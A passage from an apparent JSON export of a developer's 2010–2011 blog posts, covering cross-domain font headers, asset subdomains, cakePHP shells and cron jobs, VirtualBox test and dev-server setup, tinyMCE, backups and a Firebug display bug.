  "text": "<p>As a security reason, Firefox do not allow an <code>@font-face</code> rule to load fonts hosted on a different domain (even a subdomain).</p>\n<p>I don't exactly understand why, I guess it has something to do with preventing crosslinking and copyright violation. I think we should keep the website author handle all this stuff and not required the browser to make assumptions like that.</p>\n<p>Anyway, I recently tried to move my CSS file to a subdomain, to reduce pages loading times. Doing so I saw that my fonts did not correctly load on Firefox.</p>\n<p>After some digging, I found that I had to manually allow them to be linked from an other domain, server-side. Here is the little snippet I added to my <code>.htaccess</code></p>\n<pre><code lang=\"apache\">&lt;FilesMatch \"\\.(ttf|otf|woff)$\"&gt;<br />\t&lt;IfModule mod_headers.c&gt;<br />\t\tHeader set Access-Control-Allow-Origin \"*\"<br />\t&lt;/IfModule&gt;<br />&lt;/FilesMatch&gt;</code></pre>\n<p> </p>",
  "publish_start": "2010-11-08 16:28:17",
  "slug": "fonts-hosted-subdomain-font-face-firefox"
}, {
  "id": 238,
  "name": "Performance improvement : moving assets to subdomains",
  "text": "<p><strong>Disclaimer : What I'm talking about in this blog post can be optimised. Yes, having multiple hosts is a great feature for performance improvement, but I kind of did it wrong. My recent try at the webperf contest gave me more insight on how to do it right. </strong></p>\n<p><strong>I'll post more on the subject or update this post to reflect that.</strong></p>\n<p> </p>\n<p>I've just added to this site a performance improvement I read a long time ago but never implemented.</p>\n<p>I'm talking about the multiple domains to serve static content. There are two important things to note here : parallel requests and cookies. Let me explain in a little more details what it's all about.</p>\n<h4>Parallell requests</h4>\n<p>Your browser is only able to perform a certain number of parallel request at the same time. It means that it can only download a certain number of files concurrently (usually 4).</p>\n<p>In other words, it will start the download of, say, a CSS file, a Javascript file, and two images. Then, whenever one of this files is received, it will start downloading a new file, and so on.</p>\n<p>This means that there is a certain amount of time that is \"lost\" in the process. You have to wait for one of the files to be downloaded before starting downloading the next.</p>\n<p>The important thing to note is that the limit on the number of parallel downloads is set on a per-domain basis. It means that you can download only 4 files of <code>foo.com</code> while downloading at the same time 4 files from <code>bar.com</code>. This is the basic of what we will be using to our advantage.</p>\n<p>Splitting your files accross several domains (or subdomains) allows you to get the best of parallel download. You do not really need to have your content hosted on different servers, you just need them to be accessible through different domain names, and subdomains are just perfect for that.</p>\n<p>I have created four subdomains : <code>css.pixelastic.com</code>, <code>js.pixelastic.com</code>, <code>img.pixelastic.co</code>m and <code>dl.pixelastic.com</code>.</p>\n<p>Each one maps to the exact same site as <code>www.pixelastic.com</code> but using different names improve the number of possible downloads and thus improve page load.</p>\n<h4>Cookies</h4>\n<p>All this stuff about subdomains brings me to my second point : cookies.</p>\n<p>If you host all your files on the same domain, it means that all requests (be it a php page or a static css file) will send cookie information without you knowing.</p>\n<p>Cookie data is usually small, like 100Ko or so, but is added to every single request made. And most of the time this information is not even useful.</p>\n<p>Apart from the fact that you are slowly killing your website bandwith with useless information, your are also decreasing your page speed load for your potential user.</p>\n<p>The same trick of using a subdomain applies here too, and cookies won't be sent.</p>\n<p>There is one caveat that you should be aware of, though. If your site is accessible through <code>domain.com</code> and you host your files on <code>files.domain.com</code>, cookies will still be sent because <code>domain.com</code> is considered the master domain of <code>files.domain.com</code> and thus all cookies set on the main domain will also propagate to the subdomains.</p>\n<p>On the other hand, if your main domain is <code>www.domain.com</code>, it is not considered a parent domain of <code>files.domain.com</code> (but rather a sibling domain).</p>\n<h4>Configuring Apache</h4>\n<p>If you need to edit your <code>httpd.con</code>f file, here is what I put to add my different subdomains on my local machine :</p>\n<pre><code lang=\"apache\">&lt;VirtualHost *:80&gt;<br />\tServerName pixelastic<br />\tServerAlias www.pixelastic<br />\tServerAlias css.pixelastic<br />\tServerAlias js.pixelastic<br />\tServerAlias img.pixelastic<br />\tServerAlias dl.pixelastic<br />\tDocumentRoot \"www/pixelastic.com\"<br />\t&lt;Directory \"www/pixelastic.com\"&gt;<br />\t\tOptions Indexes FollowSymLinks Includes ExecCGI<br />\t\tAllowOverride All<br />\t\tOrder allow,deny<br />\t\tAllow from all<br />\t&lt;/Directory&gt;<br />&lt;/VirtualHost&gt;</code></pre>\n<p> </p>",
  "publish_start": "2010-11-08 21:37:18",
  "slug": "performance-improvement-moving-assets-subdomains"
}, {
  "id": 240,
  "name": "Knowing dev from prod in a cakePHP shell",
  "text": "<p>I wrote a cakePHP shell to synchronize an IMAP mailbox with a mysql table. I wanted to test my shell on local first, then upload it and make a CRON job of it.</p>\n<p>Whenever I tried to run the shell from my development environment I was greeted with various \"<em>Database table is missing</em>\" messages.</p>\n<p>After some digging, it occurs that the shell was connecting to my prod database, not the dev one.</p>\n<h4>The culprit</h4>\n<p>I wrote a little snippet to automatically switch to the correct database based on the current server name. If it was <code>localhost</code>, I used the <code>$dev</code> credentials, while keeping the <code>$default</code> credentials for other cases (ie. production).</p>\n<p>This worked great and I added this little code to my <code>database.php</code> file.</p>\n<p>But when running a shell, the <code>env('SERVER_ADDR')</code> was empty, thus my test was always selecting the prod database.</p>\n<p>I couldn't find anyway to guess if I was running a shell from prod or dev. I sure had access to a lot of config informations through <code>env</code> and <code>$_SERVER</code> but none seemed to be enough to guess the correct environment.</p>\n<h4>Solution</h4>\n<p>I finally decided that the only way was to manually pass a flag to my shell call to tell if it was to use the dev or prod credentials.</p>\n<p>I decided that adding a <code>dev</code> arg to the shell call will switch to dev mode, while not adding it will use production mode.</p>\n<pre><code lang=\"sh\">My final shell call looked like : cake -app \"path/to/app\" mail_import dev<br /></code></pre>\n<p>And I added the following logic in my database switching logic :</p>\n<pre><code lang=\"php\">// Defining the Environment (prod or dev)<br />if (defined('CAKEPHP_SHELL')) {<br />\t// Based on the prod/dev flag<br />\t$args = env('argv');<br />\t$environment = 'prod';<br />\tforeach($args as $flag) {<br />\t\tif ($flag=='dev') {<br />\t\t\t$environment = 'dev';<br />\t\t\tbreak;<br />\t\t}<br />\t}<br />} else {<br />\t// Based on the server url<br />\t$environment = (env('SERVER_ADDR')=='127.0.0.1') ? 'dev' : 'prod';<br />}</code></pre>\n<p>Note that I checked if the script was accessed through normal server/php delegation or through the CLI using <code>defined('CAKEPHP_SHELL')</code></p>",
  "publish_start": "2010-11-22 16:22:35",
  "slug": "knowing-dev-prod-cakephp-shell"
}, {
  "id": 241,
  "name": "Adding extensions to a Windows PHP",
  "text": "<p>My development environment is set up thanks to EasyPHP. I've used this app since the first days that I started to write PHP and it followed me since.</p>\n<p>I guess I have a better understanding of what it does under the scenes now and could probably work with a clean and custom Apache/MySQL/PHP install. But I like simplicity.</p>\n<p>Anyway, I just wanted to run my imap script from the CLI but ran into \"<em>Fatal error : imap_open not defined</em>\".</p>\n<p>The same script was perfectly working when accessing it from my browser but failed when launched from the CLI.</p>\n<p>That when I remember that I needed to enabled the <code>php_imap.dll</code> extensions in both EasyPHP PHP options (for web access) and <code>C:\\windows\\php.ini</code> (for cli access)</p>",
  "publish_start": "2010-11-22 16:51:27",
  "slug": "adding-extensions-windows-php"
}, {
  "id": 242,
  "name": "Running a cakePHP shell script as cronjob on Dreamhost",
  "text": "<p>Dreamhost as <a title=\"Dreamhost wiki on Crontab\" href=\"http://wiki.dreamhost.com/Crontab\" target=\"_blank\">a wonderful wiki</a> on how to set cron jobs and cakePHP has <a title=\"Cookbook page on how to set cronjobs up\" href=\"http://book.cakephp.org/view/846/Running-Shells-as-cronjobs\" target=\"_blank\">a cookbook page on how to do it</a> too, but getting it just right was a little frustrating.</p>\n<p>I finally managed to run my shell task as a cronjob, and here is how I did it.</p>\n<h4>The magic command</h4>\n<p>First, here is the command I wrote in my Dreamhost panel :</p>\n<pre><code lang=\"sh\">/home/username/domain.com/cake/console/cake -app /home/username/domain.com/app/ shell_name</code></pre>\n<p>You have to set the full path to the cake console because it obviously is not in the pre-saved paths on a default Dreamhost install.</p>\n<p>You also have to specify the <code>app</code> directory otherwise cake will search your shell in the wrong directories. This is even more important if your shell is located in a plugin directory.</p>\n<p>But, this won't work as-is, you'll have to do several other stuff, mostly explained by <a title=\"Setting up cronjob on Dreamhost with CakePHP\" href=\"http://www.milesj.me/blog/read/83/Setting-Up-Cron-Jobs-With-Cake-Shells\" target=\"_blank\">Miles Johnson</a>, but I'll recap them</p>\n<h4>Setting the file as executable</h4>\n<p>You have to set the <code>cake/console/cake</code> file as executable. It is kind of obvious, but you have to do it anyway.</p>\n<h4>Set the TERM variable</h4>\n<p>Update you <code>cake/console/cake</code> to replace the first lines with :</p>\n<pre><code lang=\"sh\">LIB=${0/%cake/}<br />APP='pwd'<br />TERM=linux<br />export TERM</code></pre>\n<p>If you don't, you'll have notice errors in the resulting log. No big deal, but it is cleaner that way.</p>\n<h4>Forcing using php5</h4>\n<p>While in command line, the php command refer to the php4 version. If you need to use php5 (and I guess you should), you would have to manually reference the binary file. Hence, you have to update your <code>cake/console/cake</code> file one more time and change the <code>exec </code>line to :</p>\n<pre><code lang=\"sh\">exec /usr/local/php5/bin/php -q ${LIB}cake.php -working \"${APP}\" \"$@\"</code></pre>\n<h4>And it's ok</h4>\n<p>Your cronjob should not work effortlessly. It took me some long hours to track all this down (along with other issues on my local dev machine that make debugging even more cloudy).</p>",
  "publish_start": "2010-11-22 20:08:45",
  "slug": "running-cakephp-shell-script-cronjob-dreamhost"
}, {
  "id": 243,
  "name": "Testing IE6 and IE7 using VirtualBox on Windows",
  "text": "<p>Testing various IE version as always been a chore. Back in the days, I managed to install both IE7 and use a standalone IE6 version.</p>\n<p>Then, I discovered <a title=\"IETester\" href=\"http://www.my-debugbar.com/wiki/IETester/HomePage\" target=\"_blank\">IETester</a> that became a lifesaver (my IE6 standalone tends to crash a little too often). It would allow me to test various IE versions side by side.</p>\n<p>Unfortunatly, the emulation wasn't perfect, some ajax calls were returning errors and the Flash support wasn't so good.</p>\n<p>Additionnaly, there was not way to use the <a title=\"IEDebugBar\" href=\"http://www.debugbar.com/?langage=en\" target=\"_blank\">IEDebugBar</a> nor the WebPageTest plugin.</p>\n<h4>Switching to VM</h4>\n<p>I finally decided to switch to a Virtual Machine. This would allow me to have an exact snapshot of a given OS/IE version.</p>\n<p><a title=\"VirtualBox\" href=\"http://www.virtualbox.org/\" target=\"_blank\">VirtualBox</a> is free, so this was my choice. Microsft used to provide <a title=\"Win/IE downloads for VirtualPC\" href=\"http://www.microsoft.com/downloads/en/details.aspx?FamilyId=21EABB90-958F-4B64-B5F1-73D0A413C8EF&amp;displaylang=en\" target=\"_blank\">free downloads of various flavors of Windows/IE</a>, but it seems to be only working with their proprietary VirtualPC (which only works under Windows 7).</p>\n<p>So I took the long road, and manually installed a Windows XP Pro through VirtualBox, using my Windows XP cd.</p>\n<p>I used the same serial than my main windows XP. I'm not exactly sure if legally, I'm allowed to do that. How does a VM fits inside the legal statements ? Am I allowed to use one windows activation key inside itself ? Well, I don't really know and don't care that much.</p>\n<h4>Starting with some housekeeping</h4>\n<p>I ended up with a nice and clean WinXP install. I had to add an antivirus quick if I wanted to keep it clean. VirtualBox provides a Shared Folder feature to exchange files between the host and the guest.</p>\n<p>Start by adding shared folders to your guest (Devices &gt; Shared Folders).</p>\n<p>Then install the \"Guest Additions\", <del>just mount the <code>VBoxGuestAdditions.iso</code> found in your VirtualBox installation directory, using DaemonTools and run the installer.</del></p>\n<p>Don't be as silly as I was. Do not install the Guest Additions on your host, but on your guest. Yeah, seems more logical that way. Just select the options in the Devices menu of your guest window. Reboot after the installation.</p>\n<p>You should now be able to access your shared folders by opening the windows Explorer (Windows + E), and going to Network places &gt; All network &gt; VirtualBox Shared Folders</p>\n<h4>Accessing your websites</h4>\n<p>I then updated the <code>C:\\WINDOWS\\system32\\drivers\\etc\\hosts</code> file to bind all requests made to my still-in-development websites to my host.</p>\n<pre><code lang=\"ini\">10.0.2.2        www.pixelastic<br />10.0.2.2        s1.pixelastic<br />10.0.2.2        s2.pixelastic<br />10.0.2.2        s3.pixelastic</code></pre>\n<p>You can find your host ip by doing a <code>ipconfig /all</code> in a command prompt.</p>\n<p>You then just have to go to http://www.pixelastic/ in IE6 to display the correct website. You can even switch to the Seamless mode to display your IE6 inside your main host.</p>",
  "publish_start": "2010-11-23 11:32:51",
  "slug": "testing-ie6-ie7-virtualbox-windows"
}, {
  "id": 244,
  "name": "Komodo Edit Tip : Using regexp in search/replace",
  "text": "<p>Here's a little tip. As I started to use more and more often the regexp search and replace feature of Komodo Edit, I guessa quick blog note could be useful.</p>\n<p>I had to \"simplify\" a big HTML file a while ago, and searching for useless tags and then replacing them using this feature saved me a lot of time.</p>\n<p>Note that you can use <code>\\n</code> and <code>\\t</code> for new line and tabulation respectively.</p>\n<p>I also had to change the order of attributes in all <code>&lt;img&gt;</code> tags (according to Google Page Speed, this is supposed to help the Gzip algorithm in compressing data).</p>\n<p>I just had to search for</p>\n<pre><code lang=\"html\">&lt;img src=\"(.*)\" width=\"(.*)\" height=\"(.*)\" alt=\"(.*)\"&gt;</code></pre>\n<p>and replace with</p>\n<pre><code lang=\"html\">&lt;img src=\"\\1\" alt=\"\\4\" height=\"\\3\" width=\"\\2\"&gt;</code></pre>\n<p> </p>",
  "publish_start": "2010-11-24 13:07:44",
  "slug": "komodo-edit-tip-regexp-search-replace"
}, {
  "id": 245,
  "name": "Deleting an element from an Array/Object in Javascript",
  "text": "<p>I'm going to post that here because it's the second time I stumble upon this \"problem\" and the second time I lost some precious time to understand what was going on.</p>\n<p>I had a Javascript Array, named <code>elements </code>and I wanted to remove one of its properties by its index <code>i</code>.</p>\n<p>I know that merely calling <code>elements[i] = null</code> won't work (the property will still be present in the array and the length won't be updated.</p>\n<p>Calling <code>delete elements[i]</code> won't work either. Same result.</p>\n<p>I had to use <code>elements.splice(i, 1)</code> to effectively remove the element and update the length value.</p>\n<p>Also note that sometimes I accidentally declare an Array when what I really want is an Object. I tend to forgot that associative <code>Arrays </code>in Javascript do not really exists, they just are <code>Objects</code>.</p>",
  "publish_start": "2010-11-25 21:34:17",
  "slug": "deleting-element-array-object-javascript"
}, {
  "id": 246,
  "name": "The dreaded <noscript> on IE7",
  "text": "<p>This <code>&lt;noscript&gt;</code> tag on IE7 is making me crazy. Here are some \"interesting\" facts about it :</p>\n<h4>No content through Javascript</h4>\n<p>You can't get its content though javascript. It can be targeted but  neither <code>.innerHTML</code> nor <code>.textContent</code> is set. It does not have any  <code>.childNodes</code> either.</p>\n<h4>Gets displayed even when scripts are enabled</h4>\n<p>If you set <code>noscript { display:block; border:15px solid red;},</code> it will  get displayed even if Javascript is enabled. But with no content inside, you'll only have borders and background...</p>\n<h4>Styling it anyway</h4>\n<p>If you want to style it, just add an inner element and style this one :</p>\n<pre><code lang=\"html\">&lt;noscript&gt;&lt;p&gt;Lorem ipsum&lt;/p&gt;&lt;/noscript&gt;</code></pre>\n<pre><code lang=\"css\">noscript p { background:blue; }</code></pre>\n<h4>Disabling Javascript on IE7</h4>\n<p>If you want to disable Javascript on IE7, you'll have to go to Tools &gt; Internet Options &gt; Security &gt; Custom and setting the \"Enable ASP scripts\" to No.</p>\n<p>Yes, this doesn't make any sense.</p>\n<br />",
  "publish_start": "2010-11-26 01:04:18",
  "slug": "dreaded-noscript-ie7"
}, {
  "id": 247,
  "name": "Using Router::connectNamed without breaking pagination",
  "text": "<p>In cakePHP, you can pass all sort of parameters to your urls by following the <code>www.domain.com/controllers/view/foo:bar/foo2:baz</code> syntax.</p>\n<p>You could then access <code>$this-&gt;params['foo']</code> and <code>$this-&gt;params['foo2']</code> in your <code>Controller::view()</code> method.</p>\n<h4>Using Router::connectName()</h4>\n<p>This does not play nice with default routing. I mean, if you define a route to add a vanity url like <code>www.domain.com/vanity</code> is routed to <code>Controller:view()</code>, you'll write something like this :</p>\n<pre><code lang=\"php\">Router::connect('/vanity', array('controller' =&gt; 'controllers', 'action' =&gt; 'view'));</code></pre>\n<p>This will work as long as you don't specify any additional parameters. Once you started to add any parameters, the Router won't be able to parse your url and instead of returning <code>www.domain.com/vanity/foo:bar/foo2:baz</code> it will return the default <code>www.domain.com/controllers/view/foo:bar/foo2:baz</code></p>\n<p>If you do want your custom parameters to be taken into account by your <code>Router</code> rules, you have to manually add them, using<code> Router::connectNamed(array('foo', 'foo2'))</code>.</p>\n<h4>Custom connectNamed()</h4>\n<p>I'll let you browse the <a title=\"Router::connectMail()\" href=\"http://api.cakephp.org/class/router#method-RouterconnectNamed\" target=\"_blank\">connectNamed()</a> documentation page for further details on how to use it properly. But one important thing not to overlook is that if you ever have to define a custom <code>Router::connectNamed()</code>, do not forget to add a second parameter of <code>array('default' =&gt; true)</code>, this will allow all your paginated links to keep working.</p>",
  "publish_start": "2010-12-02 16:41:07",
  "slug": "router-connectnamed-breaking-pagination"
}, {
  "id": 248,
  "name": "My new backup strategy for 2011",
  "text": "<p>My computer was starting to get slower and slower for the past days. And I realized my automatic backup wasn't backing anything up for the past month.</p>\n<p>And I realized I had different versions of the same files on my 2 laptops...</p>\n<p>Well, it seems I have to do some cleaning up.</p>\n<h4>Synchronizing paperwork</h4>\n<p>I started by cleaning up my <a title=\"Dropbox\" href=\"http://www.dropbox.com/\" target=\"_blank\">Dropbox </a>folder. I removed shared folders with past clients, and created a \"Paperwork\" folder where I put all my invoices, contracts and general paperwork.</p>\n<p>I also added my private <a title=\"KeePass\" href=\"http://keepass.info/\" target=\"_blank\">KeePass </a>file as well as other info I may need to access anywhere, anytime.</p>\n<p>KeePass allow me to store all my login/password credentials in a secure way (protected by a master password). It is really useful to have this file on all my computers (and mobile phone).</p>\n<p>Dropbox is excellent for storing simple files, that you need everywhere. Being able to access invoices and contracts even from my mobile phone proved quite valuable when meeting clients.</p>\n<h4>Hard backup of personal files</h4>\n<p>I've also changed my scheduled backups of personal files. I bought an <a title=\"Acronis\" href=\"http://www.acronis.com/\" target=\"_blank\">Acronis True Image</a> last year, and reconfigured it today.</p>\n<p>I have a hard drive whose sole purpose is to save backups. I scheduled for the first of each month to save : my system state, my applications configuration, and my personal files (photos, saved gamed, writings, etc).</p>\n<p>I manually started all this backups to have a clean start. I also forced the backup to restart a whole new file every 6 month (opposed to using the incremental backup).</p>\n<h4>Backing up my music and movies</h4>\n<p>I did not spent too much time figuring how to save my hundred of Go of music and movies. I rarely watch the same movies twice, so losing them won't affect me too much.</p>\n<p>I occasionally re-watch series, though, but as most of my friends have the same tastes as I, I could very easily get them back from them, or download them (again).</p>\n<p>Regarding music, well, I have quite a big collection, but most of it is already \"backed up\" on my portable mp3 player.</p>\n<h4>Automatic synchronizing with BitBucket</h4>\n<p>On my day work, I now always version my files using Mercurial. <a title=\"BitBucket\" href=\"http://bitbucket.org/\" target=\"_blank\">BitBucket</a> offers unlimited storage, and unlimited public repositories. Private repo are limited to 5 users. As I'm mostly alone on projects that should stay private, this seems the best deal I could found.</p>\n<p>Mercurial being a versionning system, I got all the benefits of a backup here, being able to revert to previous versions, update it whenever I want and access it from anywhere.</p>\n<p>I wrote a custom Hg hook on commit to automatically push my repos to BitBucket at least once a day (I'll post the code in a future post).</p>\n<h4>MySQL Backup</h4>\n<p>I used to backup mysql databases on my work computer using a windows app. This was slowing down my computer on every boot as well and backup was thus only effective when I was working and not when I was on vacations.</p>\n<p>Today, I wanted something a lot more flexible, so I set a cronjob on my main host coupled with a slightly edited <a title=\"AutoMySQLBackup\" href=\"http://sourceforge.net/projects/automysqlbackup/\" target=\"_blank\">autoMySQLBackup </a>script.</p>\n<p>This will automatically run everyday at midnight and make a local save (with daily, weekly and monthly rotate) of all my clients databases. Logs are saved on disk and gzipped, and will also be sent to a special backup@pixelastic.com mail address (stored on GMail).</p>\n<p>This way I am sure to have my mysql backups on two different hosts, with daily and automatic saves, that I can access from anywhere if anything goes wrong.</p>\n<h4>Conclusion</h4>\n<p>It took me almost two full days to get the right tools, configure them and write my custom scripts but now, it is seamlessly integrated with my daily workflow. This is a weight off my shoulders, I know I can safely work as usual and my files are saved and easily accessible.</p>",
  "publish_start": "2010-12-07 13:58:26",
  "slug": "backup-strategy-2011"
}, {
  "id": 249,
  "name": "Adding a <hr> in a tinyMCE instance",
  "text": "<p>When using the default tinyMCE implementation to add an <code>&lt;hr&gt;</code> element to the editor content, the <code>&lt;hr&gt;</code> is added inside its parent <code>&lt;p&gt;</code> element (when it should be an element on its own, without such a parent).</p>\n<p>I've added my own plugin to resolve this small issue, here is the code :</p>\n<pre><code lang=\"js\">(function() {<br />\ttinymce.create('tinymce.plugins.pixelastic_hrPlugin', {<br />\t\tinit : function(editor, url) {<br />\t\t\t// Register the command<br />\t\t\teditor.addCommand('mcepixelastic_hr', function() {<br />\t\t\t\t// We get the parent node<br />\t\t\t\tvar parentNode = editor.selection.getNode(),<br />\t\t\t\tuniqueId = editor.dom.uniqueId();<br />\t\t\t\t// We insert the hr (with a unique id to select it later)<br />\t\t\t\teditor.execCommand('mceInsertContent', false, '&lt;hr id=\"'+uniqueId+'\" /&gt;');<br />\t\t\t\tvar hr = editor.dom.select('#'+uniqueId)[0];<br />\t\t\t\t// We split the parent element around the hr<br />\t\t\t\teditor.dom.split(parentNode, hr);<br />\t\t\t\t// We remove the temporary id<br />\t\t\t\t$(hr).attr('id', null);<br />\t\t\t});<br />\t\t\t// Adding a button<br />\t\t\teditor.addButton(pluginName, { title : 'pixelastic_hr.desc', cmd : 'mcepixelastic_hr' });<br />\t\t\t}<br />\t\t}<br />\t});<br />\t// Register plugin<br />\ttinymce.PluginManager.add('pixelastic_hr', tinymce.plugins['pixelastic_hrPlugin']);<br />})();</code></pre>\n<p>The trick to use the <code>editor.dom.split</code> method to split the parent element around the <code>&lt;hr&gt;</code> element.</p>\n<p>The dirty hacks is that there is no way to get a direct reference to a DOM element added through <code>mceInsertContent</code>, so we need to set a temporary unique id and then select it through this id.</p>\n<p>I use jQuery in my example and I strongly suggest you to do the same, the selectors it provides are much sexier and helps writing these kind of plugins pretty fast.</p>",
  "publish_start": "2010-12-11 17:29:22",
  "slug": "adding-hr-tinymce-instance"
}, {
  "id": 268,
  "name": "Making Flash and Javascript speaks to each other",
  "text": "<p>I needed a Flash app and my Javascript code to be able to communicate. The Flash needed to call some methods in the Javascript, and in turn the Javascript needed to inject back some data into the Flash.</p>\n<p>I let my Flash coder colleague took care of the Flash side, he needed to implement ExternalInterface, register some callbacks methods that I could call and more importantly change some security settings to make it work.</p>\n<p>On my side, I just needed to get the <code>object </code>element holding the Flash (thanks to <code>swfobject.getObjectById</code> it was pretty easy) and call the callback method registered in Flash on it.</p>\n<p>Piece of cake.</p>\n<p>Have a look at this <a href=\"http://circlecube.com/2010/12/actionscript-as3-javascript-call-flash-to-and-from-javascript/\">blog post from CircleCube</a>, it does a pretty neat job at explaining all of that.</p>\n<p>Update :</p>\n<p>I finally had some issues with this implementation. It was working perfectly on some servers but not on others. We finally found that calling Security.allowDomain('*.mainhost.com') wasn't working.</p>\n<p>You have to explicitly allow each domain/subdomain.</p>\n<p>As our code would be deployed on various duplicate domains, we had to manually pass as a flash var the domain to allow.</p>",
  "publish_start": "2011-03-24 15:50:46",
  "slug": "making-flash-javascript-speaks"
}, {
  "id": 269,
  "name": "Installing Ubuntu in VirtualBox to work as a development server",
  "text": "<p>I was tired of trying to install Lighttpd on Windows (hint : don't try, it's a mess. I found no way to get vhosts and php as cgi at the same time). So I finally decided that Linux was the way to go.</p>\n<p>I have always developped using Windows, and even if I'm slowly migrating to Ubuntu at home, I'm still using Windows 7 at work. The solution that best fits me was still using my Windows environment for coding, but using Ubuntu inside a VM to act as a server.</p>\n<p>Let's see how I did that :</p>\n<h4>Required components</h4>\n<p>First, let's clarify what I'll have to install for this project : Lighttpd as the webserver, mysql and memcached for storing data and php5 to run cakePHP.</p>\n<h4>Step One : Running Ubuntu inside a VM</h4>\n<p>Start by downloading the <a title=\"Ubuntu iso files\" href=\"http://www.ubuntu.com/business/get-ubuntu/download\" target=\"_blank\">Ubuntu iso</a> (i's 687Mo, you'd better start this download first). I personnaly used the 10.04 Desktop version (I tried the 10.10 Server version first but I feel more confident with a UI).</p>\n<p>Then, download <a href=\"http://www.virtualbox.org/wiki/Downloads\" target=\"_blank\">the latest VirtualBox version </a>(4.0.4 at the time of this writing).</p>\n<p>And mount the iso in VirtualBox and start the install. This is pretty easy and you should be done in 10mn. Once the install is finished, you'll be prompted to reboot. Do not reboot just now. Instead, shutdown your guest machine (you can type <code>sudo halt</code> if the GUI does not work).</p>\n<p>Once back in Windows, go to your VM config and unmount the install iso, otherwise the install procedure will be started again everytime you load your VM.</p>\n<p>Once it's done, you can reboot the gues and once loaded, select the in VirtualBox Menu =&gt; Devices =&gt; Install guest additions. The next popup can take some long minutes to show, so be patient. This will install the guest additions that will allow you to easily communicate between the guest and host machines.</p>\n<p>Once installed, reboot once more, and you should have the guest addition image sitting on your desktop.</p>\n<p>Start a terminal and install the guest additions by doing :</p>\n<pre><code lang=\"sh\">cd /media/{name of your VBOX image}<br />./autorun.sh</code></pre>\n<p>This will finish the guest addition installation. Reboot your guest machine one last time and you'll be ready for step 2.</p>\n<h4>Step 2 : Installing the server stuff</h4>\n<p>We will now install the various components we'll need. You could probably install them all with one command but I'll split them in different line so you'll correctly see what's installed.</p>\n<p>First, lighttpd :</p>\n<pre><code lang=\"sh\">sudo apt-get install lighttpd</code></pre>\n<p>Now, memcached</p>\n<pre><code lang=\"sh\">sudo apt-get install memcached</code></pre>\n<p>And mysql server. This one will prompt you to enter the root password you'll want.</p>\n<pre><code lang=\"sh\">sudo apt-get install mysql-server</code></pre>\n<p>Now we will install php5 as CGI (Lighty will run php as cgi), as well as the needed dependency so php can connect to both mysql and memcache.</p>\n<pre><code lang=\"sh\">sudo apt-get install php5-cgi php5-memcache php5-mysql<br /></code></pre>\n<p>Ok, you should now have everything correctly installed. We will configure all that stuff later. You should now completely close your Virtual Machine and get back to Windows. It's time to configure your host and guest so they can correctly communicate</p>\n<h4>Step 3 : Enabling communication between host and guest</h4>\n<p>What we will do in this section is configure your network so the guest machine is considered part of your network and so you can connect to id using SSH and classic http.</p>\n<p>First, go back to your VM config and change the Network mode to \"Bridged\". This will allow both machine to see each other in your network easily.</p>\n<p>Then, define the Shared folder you want shared from your host in your guest. I shared my websites directories so Lighty could access them from the guest.</p>\n<p>Now, start your VM, and type <code>sudo ifconfig</code> in a terminal. You should see your guest machine ip. Mine was 192.168.1.16.</p>\n<p>Knowing that IP, you can define hosts in your Windows <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code></p>\n<p><span>You should also install openssh server so that you'll be able to connect to your guest machine using ssh :</span></p>\n<pre><span><code lang=\"sh\">sudo apt-get install openssh-server</code></span></pre>\n<p>We will now take care of the shared folder defined earlier. Selecting them in VirtualBox only made them available for mounting in the guest, but you'll now have to type some more commands to effectively see them. I needed to have access to a project I coded in my host (let's name it <code>myproject</code>).</p>\n<p>Here's how I made it available to Lighty :</p>\n<pre><code lang=\"sh\">sudo mkdir /var/www/myproject<br />sudo mount -t vboxsf -o rw,uid=$(id -u),gid=$(id -g www-data) myproject /var/www/myproject</code></pre>\n<p>This will create a directory in <code>/var/www</code> to hold the project, and will then mount the shared folder to that directory. The uid/gid stuff indicate that you (the current user) is the owner and <code>www-data</code> is the group. Doing so will fix access rights issues you may have with Lighty.</p>\n<p>You should have to re-run the last command on every login, so I strongly suggest you to put it in <code>/etc/rc.local</code> so it gets executed automatically.</p>\n<h4>Step 4 : Configuring all that stuff</h4>\n<p>I won't go into much details on how to configure lighty or php because it is not the scope of this post. I might post on that subject later, though. But here is one important step you shouldn't forget : uncomment the cgi.fix_pathinfo=1 line in your php.ini.</p>\n<p>Don't forget to reload Lighty after changes to its config files by running:</p>\n<pre><code lang=\"sh\">sudo /etc/init.d/lightppd restart<br /></code></pre>\n<p>I also had one additional side-effect on my install : installing php5 also installed Apache, causing Lighty to fail on startup because Apache was already using the port 80. I fixed it by removing every reference to Apache by running :</p>\n<pre><code lang=\"sh\">sudo update-rc.d -f apache2 remove</code></pre>\n<h4>Final note :</h4>\n<p>If you followed this instruction, you should have a server running inside a VM that runs your website stored in your host. Isn't that pretty ?</p>",
  "publish_start": "2011-03-31 18:36:24",
  "slug": "installing-ubuntu-virtualbox-work-development-server"
}, {
  "id": 270,
  "name": "Firebug 1.7 moving headers to raw POST source",
  "text": "<p><em>Edit : The issue discussed here has been fixed in <a href=\"http://getfirebug.com/releases/firebug/1.9/firebug-1.9.0a2.xpi\">Firebug 1.9a2</a></em></p>\n<p>It took me a whole day to track this bug down. At first I thought something was wrong in my request, I tried to replay it using Firebug and I kept hitting a \"malformed request\" error.</p>\n<p>Debugging it in reverse order, using Wireshark and other tools I finally came to the conclusion that my request was indeed valid.</p>\n<h4>So what ?</h4>\n<p>The guilty part was indeed Firebug. When I ran a simple <code>POST</code> request from Flash, and inspect it from Firebug, I could spot that no <code>Content-Length</code> nor <code>Content-Type</code> headers were displayed in the \"Headers\" part. I then saw that the \"source\" part of the <code>POST </code>tab contains my missing headers. What was that ?</p>\n<p>HTTP POST Request are supposed to be split into two parts. First part are the headers, each separated by a <code>\\r\\n</code>. Then, after and empty line was the <code>POST </code>raw content. Seeing that my headers gets mixed up with the <code>POST </code>data I thought that the request was malformed and a <code>\\r\\n</code> was added too early.</p>\n<p>I checked with Wireshark and with PHP on the back end, and no, the request was indeed absolutly valid. Wireshark did not show any <code>\\r\\n</code> that shouldn't be there and PHP correctly parsed my request. The only issue was the details displayed by Firebug.</p>\n<h4>So it's a display bug ? I can live with it.</h4>\n<p>Well, actually, it's a little more than just a display bug. It kind of blocks my usual debugging workflow.</p>\n<p>To debug an XHR request, I don't usually restart the whole page request just to debug one of the inner request.</p>\n<p>The Firebug ability to \"open request in new tab\" is a time saver for me. I can play and replay the same request over and over until it's debuggued.</p>\n<p>But with this bug, I can't use this feature. Opening the request in new tab will not send the slipped headers, and will instead send them in the <code>POST </code>source, resulting in a corrupted posted data.</p>\n<p>I've <a 